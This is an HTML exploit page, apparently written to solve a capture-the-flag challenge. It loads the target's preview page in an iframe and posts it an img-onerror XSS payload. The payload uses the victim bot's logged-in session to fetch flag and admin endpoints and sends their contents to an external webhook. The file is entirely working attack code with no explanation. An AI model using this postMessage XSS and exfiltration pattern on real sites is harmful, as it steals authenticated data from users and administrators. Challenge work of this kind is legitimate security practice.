<!doctype html>
<html>
    <body>
        <iframe
            id="f"
            src="https://2208c656-d0b0-4927-b65e-587a7bbb21d6.offsec.m0lecon.it/preview"
        ></iframe>
        <script>
            const WEBHOOK =
                "https://eorpvwpcvsuauqy.m.pipedream.net";
            const payload = `<img src=x onerror="
              async function run() {
                const WEBHOOK = '${WEBHOOK}';
                
                // Fetch these via the bot's authenticated session
                const targets = ['/api/flag', '/flag', '/api/admin'];
                
                for (const ep of targets) {
                  await new Promise(r => setTimeout(r, 1000));
                  const res = await fetch(ep, {credentials:'include'});
                  const text = await res.text();
                  await fetch(WEBHOOK + '?ep=' + encodeURIComponent(ep), {
                    method: 'POST',
                    mode: 'no-cors',
                    body: text
                  });
                }
              }
              run();
            ">`;

            document.getElementById("f").onload = () => {
                document
                    .getElementById("f")
                    .contentWindow.postMessage({ html: payload }, "*");
            };
        </script>
    </body>
</html>
